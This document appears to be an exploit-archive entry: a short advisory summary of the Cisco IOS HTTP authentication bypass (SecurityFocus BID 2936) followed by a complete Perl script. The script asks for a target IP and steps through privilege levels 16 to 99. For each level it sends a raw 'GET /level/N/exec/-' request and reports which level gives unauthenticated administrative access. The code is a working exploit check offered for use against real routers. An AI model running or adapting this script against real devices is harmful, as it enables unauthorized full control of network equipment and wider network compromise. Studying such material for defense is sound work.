# source: https://www.securityfocus.com/bid/2936/info
# 
# IOS is router firmware developed and distributed by Cisco Systems. IOS functions on numerous Cisco devices, including routers and switches.
# 
# It is possible to gain full remote administrative access on devices using affected releases of IOS. By using a URL of http://router.address/level/$NUMBER/exec/.... where $NUMBER is an integer between 16 and 99, it is possible for a remote user to gain full administrative access.
# 
# This problem makes it possible for a remote user to gain full administrative privileges, which may lead to further compromise of the network or result in a denial of service. 
# 

#!/usr/bin/perl
# modified roelof's uni.pl
# to check cisco ios http auth bug
# cronos <cronos@olympos.org>
use Socket;
print "enter IP (x.x.x.x): ";
$host= <STDIN>;
chop($host);
$i=16;
$port=80;
$target = inet_aton($host);
$flag=0;
LINE: while ($i<100) { 
# ------------- Sendraw - thanx RFP rfp@wiretrip.net
my @results=sendraw("GET /level/".$i."/exec/- HTTP/1.0\r\n\r\n");
foreach $line (@results){
        $line=~ tr/A-Z/a-z/;
        if ($line =~ /http\/1\.0 401 unauthorized/) {$flag=1;}
        if ($line =~ /http\/1\.0 200 ok/) {$flag=0;}
} 
        if ($flag==1){print "Not Vulnerable with $i\n\r";}
                else {print "$line Vulnerable with $i\n\r"; last LINE; }
        $i++;
sub sendraw {
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}
}